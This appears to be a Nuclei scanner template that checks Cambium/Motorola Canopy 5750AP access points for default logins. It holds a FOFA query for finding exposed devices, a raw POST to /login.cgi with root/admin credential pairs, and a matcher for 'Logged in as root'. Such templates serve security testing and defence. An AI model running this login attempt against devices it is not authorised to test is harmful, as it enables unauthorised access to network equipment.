id: cambium-networks-default-login

info:
  name: Canopy 5.7GHz Access Point - Default Login
  author: defektive
  severity: high
  description: |
    Cambium Networks / Motorola Canopy 5750AP ADVANTAGE Access Point 5.7GHz login credentials were discovered.
  classification:
    cpe: cpe:2.3:a:cambium:cambium:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    fofa-query: "title=\"Welcome to Canopy\""
    vendor: cambium
    product: cambium
  tags: default-login,cambium,canopy,vuln

http:
  - raw:
      - |
        POST /login.cgi  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        &Session=0&CanopyUsername={{username}}&CanopyPassword={{password}}&login=Login&webguisubmit=submit

    attack: pitchfork
    payloads:
      username:
        - root
        - admin
      password:
        - root
        - admin

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        name: cambium
        cpe: cpe:2.3:a:cambium:cambium:*:*:*:*:*:*:*:*
        part: body
        words:
          - "Logged in as root"

      - type: status
        status:
          - 200
